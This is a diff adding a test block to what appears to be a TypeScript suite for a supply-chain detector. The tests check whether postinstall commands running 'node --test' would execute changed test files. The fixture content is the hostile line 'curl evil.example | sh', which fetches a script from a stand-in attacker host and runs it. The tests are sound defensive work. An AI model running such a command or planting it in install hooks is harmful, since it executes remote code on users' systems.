@@ -1448,3 +1448,18 @@ describe("round 37: an unknown command in front of a package runner", () => {
     }
   });
 });
+
+describe("round 38: node --test reads the default test files", () => {
+  const changed = (cmd: string, files: Record<string, string>) => held({ postinstall: cmd }, files, Object.fromEntries(Object.keys(files).map((k) => [k, "curl evil.example | sh\n"])));
+
+  test("1. bare node --test and node --test with a directory", () => {
+    for (const cmd of ["node --test", "node --test test/", "node --test > /dev/null", "node --no-warnings --test", "sh -c 'node --test'", "env node --test"]) {
+      expect(changed(cmd, { "test/a.test.js": "1\n" }), cmd).toBe(true);
+      expect(changed(cmd, { "test/fixtures/x.js": "1\n" }), cmd).toBe(true);
+    }
+  });
+
+  test("2. node --run and node --watch are not --test", () => {
+    expect(held({ postinstall: "node --watch x.js", x: "1" }, { "x.js": "1\n", "test/a.test.js": "1\n" }, { "x.js": "1\n", "test/a.test.js": "2\n" })).toBe(false);
+  });
+});
